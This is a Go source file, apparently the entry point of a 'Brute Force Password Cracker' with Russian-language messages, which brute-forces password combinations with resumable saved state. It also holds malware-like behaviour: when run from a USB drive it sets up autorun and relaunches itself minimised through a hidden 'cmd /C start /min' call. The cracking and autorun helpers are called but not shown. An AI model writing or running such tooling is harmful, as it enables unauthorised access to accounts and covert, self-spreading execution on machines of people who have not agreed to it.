package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"bruteforce/autostart"
	"bruteforce/config"
	"bruteforce/core"
)

func main() {
	if autostart.IsRunningFromUSB() {
		autostart.SetupAutorun()
		exec.Command("cmd", "/C", "start", "/min", filepath.Base(os.Args[0])).Run()
		os.Exit(0)
	}

	fmt.Println("Brute Force Password Cracker")
	fmt.Println("--------------------------")

	state, err := core.LoadState()
	if err != nil {
		fmt.Printf("Ошибка загрузки состояния: %v\n", err)
		return
	}

	var choice string
	if state.CurrentCombo != "" {
		fmt.Printf("Найдено сохраненное состояние: длина %d, комбинация '%s'\n",
			state.CurrentLength, state.CurrentCombo)
		fmt.Print("Хотите продолжить (c) или начать заново (n)? [c/n]: ")
		scanner := bufio.NewScanner(os.Stdin)
		if scanner.Scan() {
			choice = scanner.Text()
		}
	}

	buffer := make([]rune, config.MaxLength)

	for length := state.CurrentLength; length <= config.MaxLength; length++ {
		fmt.Printf("\n[+] Перебор паролей длины %d...\n", length)

		startFrom := ""
		if strings.ToLower(choice) != "n" && length == state.CurrentLength {
			startFrom = state.CurrentCombo
		}

		core.BruteForce(buffer, 0, length, startFrom)

		state.CurrentCombo = ""
		if err := core.SaveState(length+1, ""); err != nil {
			fmt.Printf("Ошибка сохранения состояния: %v\n", err)
		}
	}

	fmt.Println("\n[!] Все комбинации перебраны. Пароль не найден.")
}
